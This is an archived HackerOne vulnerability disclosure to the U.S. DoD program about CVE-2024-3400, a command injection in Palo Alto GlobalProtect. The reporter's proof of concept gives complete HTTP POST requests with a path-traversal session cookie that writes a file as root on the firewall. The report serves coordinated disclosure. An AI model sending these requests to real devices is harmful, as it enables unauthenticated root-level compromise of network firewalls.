---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2026-01-12
submitted: 2024-04-18T01:02:47.138Z
bounty_usd: null
votes: 14
cve: "CVE-2024-3400"
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "0xr2r"
source: "https://hackerone.com/reports/2468496"
title: "GlobalProtect - OS Command Injection #█████████"
---
# GlobalProtect - OS Command Injection #█████████

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 14 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2026-01-12

- Report: [https://hackerone.com/reports/2468496](https://hackerone.com/reports/2468496)
- CWE: OS Command Injection | CVE: CVE-2024-3400
- Submitted: 2024-04-18T01:02:47.138Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Description:**
A command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.Cloud NGFW, Panorama appliances, and Prisma Access are not impacted by this vulnerability.



## References
    - https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-CVE-2024-3400/
    - https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis
    - https://nvd.nist.gov/vuln/detail/CVE-2024-3400

## Impact

GlobalProtect - OS Command Injection

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
#poc


CVE-2024-3400 Palo Alto OS Command Injection

send this HTTP request:


██████

you will create hellome1337.txt file on the server with root access

now if you try to access the files you should receive 403 insted of 404

███

More Info :
https://github.com/h4x0r-dz/CVE-2024-3400?tab=readme-ov-file
 https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/

## Timeline

- **Report Filed**
- **2024-04-18** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2024-04-18** @0xr2r: More Info :
https://github.com/ihebski/CVE-2024-3400
https://github.com/h4x0r-dz/CVE-2024-3400?tab=readme-ov-file
https://www.youtube.com/watch?v=BpFYADSQPLs
https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/
- **Report Vulnerability Types Updated**
- **Report Severity Updated**
- **Report Triaged**
- **2024-04-23** @0xr2r: hi @agent-j5 

Thank you for accepting the report. I made a mistake adding the error images here. poc


#Steps to produce the vulnerability :
---------------------------------------------------------------------------------------------------------

#1. Check whether file (0xr2r.txt) is present on device by running below get request or We can verify same by openinig 

█████████  Url in browser 

if you get 404 response that means file is not present.

----------------------------------------------------------------------------------------------------------

POST /ssl-vpn/hipreport.esp HTTP/1.1
Host: ███
Cookie:  SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/0xr2r.txt
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

-----------------------------------------------------------------------------------------------------------

#2.now put file (0xr2r.txt) on device by running below post request . this will create file on device under given path with root assess.

-----------------------------------------------------------------------------------------------------------

POST /ssl-vpn/hipreport.esp HTTP/1.1
Host: ██████████
Cookie:  SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/0xr2r.txt
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

user=0xr2r&portal=0xr2r&authcookie=284ad748-7ce2-4753-a39a-aa381b18cf70&domain=0xr2r&computer=0xr2r&client-ip=0xr2r&client-ipv6=0xr2r&md5-sum=0xr2r&gwHipReportCheck=0xr2r


------------------------------------------------------------------------------------------------------------

#3. now again if you try to access the files you should receive 403 insted 404. this proves file (0xr2r.txt)  is present on device 
with root access. 

```
POST /ssl-vpn/hipreport.esp HTTP/1.1
Host: █████████
Cookie:  SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/0xr2r.txt
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 170

user=0xr2r&portal=0xr2r&authcookie=284ad748-7ce2-4753-a39a-aa381b18cf70&domain=0xr2r&computer=0xr2r&client-ip=0xr2r&client-ipv6=0xr2r&md5-sum=0xr2r&gwHipReportCheck=0xr2r

```

#I know that the loophole is understandable, but I wanted to attach this to clarify
- **Report Resolved**
- **2024-04-24** @0xr2r: Hi @terminalnode, Can you disclose this issue publicly as it is resolved now.
- **2024-04-24** @terminalnode: @0xr2r 

Please give it a few business days for the disclosure to take place by our team handling this for you as long as it meets the criteria. Thanks for your patience.

Regards,
The VDP Team
- **2024-04-24** @0xr2r: @terminalnode Thank you
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
